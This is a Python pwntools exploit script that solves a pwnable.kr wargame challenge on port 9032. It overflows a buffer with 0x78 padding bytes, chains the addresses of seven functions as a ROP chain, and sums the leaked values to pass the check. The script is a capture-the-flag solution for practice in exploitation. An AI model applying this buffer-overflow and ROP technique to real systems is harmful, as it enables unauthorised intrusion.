from pwn import *

r = remote("pwnable.kr", 9032)

sla = r.sendlineafter

A = 0x809FE4B  # A()
B = 0x809FE6A  # B()
C = 0x809FE89  # C()
D = 0x809FEA8  # D()
E = 0x809FEC7  # E()
F = 0x809FEE6  # F()
G = 0x809FF05  # G()
main = 0x809FF24  # main()

sla(b"Select Menu:", b"0")

payload = b"A" * 0x78
payload += p32(A)
payload += p32(B)
payload += p32(C)
payload += p32(D)
payload += p32(E)
payload += p32(F)
payload += p32(G)
payload += p32(main + 216)  # call ropme

sla(b"How many EXP did you earned? : ", payload)

r.recvuntil(b"EXP +")
a = int(r.recvuntil(b")")[:-1])

r.recvuntil(b"EXP +")
b = int(r.recvuntil(b")")[:-1])

r.recvuntil(b"EXP +")
c = int(r.recvuntil(b")")[:-1])

r.recvuntil(b"EXP +")
d = int(r.recvuntil(b")")[:-1])

r.recvuntil(b"EXP +")
e = int(r.recvuntil(b")")[:-1])

r.recvuntil(b"EXP +")
f = int(r.recvuntil(b")")[:-1])

r.recvuntil(b"EXP +")
g = int(r.recvuntil(b")")[:-1])

sum = a + b + c + d + e + f + g
if sum > 0x7FFFFFFF:
    sum -= 0x100000000

sla(b"Select Menu:", b"0")
sla(b"How many EXP did you earned? : ", str(sum).encode())

r.interactive()
